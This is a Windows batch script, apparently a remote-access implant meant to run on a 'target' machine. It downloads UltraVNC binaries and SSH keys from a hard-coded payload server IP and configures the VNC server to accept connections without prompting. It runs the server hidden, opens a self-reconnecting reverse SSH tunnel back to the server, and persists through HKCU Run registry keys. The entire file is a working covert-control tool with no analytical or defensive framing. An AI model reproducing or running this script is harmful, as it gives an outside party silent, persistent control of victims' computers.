@echo off
REM ================================================================
REM Run ON THE TARGET (no admin needed). Fully automatic:
REM   1. Creates %APPDATA%\vnc\ and downloads everything it needs
REM      from the VPS payload server, matched to CPU architecture:
REM      winvnc.exe + ddengine + vnchooks + logging + logmessages
REM   2. Writes ultravnc.ini (loopback-only VNC server)
REM   3. Starts VNC server + reverse SSH tunnel (VPS:5901 -> here:5900)
REM      using built-in OpenSSH (Win10+) or plink fallback (older)
REM   4. Autostarts both via HKCU Run key (survives reboot, no admin)
REM ================================================================

setlocal
set VPS=5.231.61.144
set D=%APPDATA%\vnc
set SSH=C:\Windows\System32\OpenSSH\ssh.exe
set ARCH=%PROCESSOR_ARCHITECTURE%

if /i "%ARCH%"=="AMD64" (
  set VNCBIN=winvnc.exe
  set DDENGINE=ddengine_x64.dll
  set VNCHOOKS=vnchooks_x64.dll
  set LOGGING=logging_x64.dll
  set LOGMSG=logmessages_x64.dll
) else (
  set VNCBIN=winvnc_x86.exe
  set DDENGINE=ddengine_x86.dll
  set VNCHOOKS=vnchooks_x86.dll
  set LOGGING=logging_x86.dll
  set LOGMSG=logmessages_x86.dll
)

mkdir "%D%" 2>nul

REM --- fetch the arch-matched file set + keys
REM (curl on Win10 1809+, PowerShell WebClient fallback for older)
if exist %SystemRoot%\System32\curl.exe (
  if not exist "%D%\winvnc.exe" curl -s -o "%D%\winvnc.exe" http://%VPS%:8000/%VNCBIN%
  if not exist "%D%\ddengine.dll" curl -s -o "%D%\ddengine.dll" http://%VPS%:8000/%DDENGINE%
  if not exist "%D%\vnchooks.dll" curl -s -o "%D%\vnchooks.dll" http://%VPS%:8000/%VNCHOOKS%
  if not exist "%D%\logging.dll" curl -s -o "%D%\logging.dll" http://%VPS%:8000/%LOGGING%
  if not exist "%D%\logmessages.dll" curl -s -o "%D%\logmessages.dll" http://%VPS%:8000/%LOGMSG%
  if not exist "%D%\ssh_key" curl -s -o "%D%\ssh_key" http://%VPS%:8000/ssh_key
  if not exist "%D%\tunnel_key.ppk" curl -s -o "%D%\tunnel_key.ppk" http://%VPS%:8000/tunnel_key.ppk
) else (
  if not exist "%D%\winvnc.exe" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%VNCBIN%','%D%\winvnc.exe')"
  if not exist "%D%\ddengine.dll" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%DDENGINE%','%D%\ddengine.dll')"
  if not exist "%D%\vnchooks.dll" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%VNCHOOKS%','%D%\vnchooks.dll')"
  if not exist "%D%\logging.dll" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%LOGGING%','%D%\logging.dll')"
  if not exist "%D%\logmessages.dll" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/%LOGMSG%','%D%\logmessages.dll')"
  if not exist "%D%\ssh_key" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/ssh_key','%D%\ssh_key')"
  if not exist "%D%\tunnel_key.ppk" powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('http://%VPS%:8000/tunnel_key.ppk','%D%\tunnel_key.ppk')"
)
for %%F in (winvnc.exe ddengine.dll vnchooks.dll logging.dll logmessages.dll ssh_key tunnel_key.ppk) do (
  if not exist "%D%\%%F" ( echo [-] %%F download failed & exit /b 1 )
)

REM --- UltraVNC config: loopback-only server, password required
REM (password hash is a placeholder - generate your own by setting a
REM  password once in UltraVNC and copying the passwd= line here)
> "%D%\ultravnc.ini" echo [ultravnc]
>> "%D%\ultravnc.ini" echo passwd=a34fe3a7a72838fe
>> "%D%\ultravnc.ini" echo LoopbackOnly=1
>> "%D%\ultravnc.ini" echo AllowLoopback=1
>> "%D%\ultravnc.ini" echo FileTransfer=0
>> "%D%\ultravnc.ini" echo Prompt=0

REM --- make UltraVNC read our ini from the same folder (portable mode)
type nul > "%D%\ultravnc.portable"

REM --- start VNC server (127.0.0.1:5900 only, reachable only via tunnel)
cd /d "%D%"
start "" /min "%D%\winvnc.exe"

REM --- SSH client: built-in OpenSSH (Win10 1809+) or bundled plink fallback
if not exist "%SSH%" (
  echo [^*] No built-in OpenSSH, fetching plink.exe...
  set PLINKURL=https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe
  if /i "%ARCH%"=="x86" set PLINKURL=https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe
  if exist %SystemRoot%\System32\curl.exe (
    curl -s -o "%D%\plink.exe" %PLINKURL%
  ) else (
    powershell -nologo -noprofile -command "[Net.ServicePointManager]::SecurityProtocol='Tls12';(New-Object Net.WebClient).DownloadFile('%PLINKURL%','%D%\plink.exe')"
  )
  if not exist "%D%\plink.exe" ( echo [-] plink download failed & exit /b 1 )
  set SSH=%D%\plink.exe
)

REM --- tunnel loop: reconnect every 5s, restricted key, no shell
> "%D%\tunnel_loop.bat" echo @echo off
>> "%D%\tunnel_loop.bat" echo :loop
if /i "%ARCH%"=="x86" goto plink_loop
>> "%D%\tunnel_loop.bat" echo "%SSH%" -N -R 5901:127.0.0.1:5900 -i "%D%\ssh_key" -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ServerAliveInterval=15 -o ExitOnForwardFailure=yes tunneler@%VPS%
>> "%D%\tunnel_loop.bat" echo timeout /t 5 /nobreak ^>nul
>> "%D%\tunnel_loop.bat" echo goto loop
goto loop_done
:plink_loop
REM ppk key already downloaded from the payload server
>> "%D%\tunnel_loop.bat" echo "%SSH%" -ssh -N -batch -i "%D%\tunnel_key.ppk" -R 5901:127.0.0.1:5900 tunneler@%VPS%
>> "%D%\tunnel_loop.bat" echo timeout /t 5 /nobreak ^>nul
>> "%D%\tunnel_loop.bat" echo goto loop
:loop_done

start "" /min cmd /c "%D%\tunnel_loop.bat"

REM --- autostart for this user (no admin required)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v VncServer /t REG_SZ /d "\"%D%\winvnc.exe\" -run" /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v VncTunnel /t REG_SZ /d "%D%\tunnel_loop.bat" /f >nul

echo [+] VNC server running (loopback only)
echo [+] Tunnel: VPS:5901 -^> this host:5900
echo [+] Autostart registered (HKCU Run: VncServer + VncTunnel)
endlocal
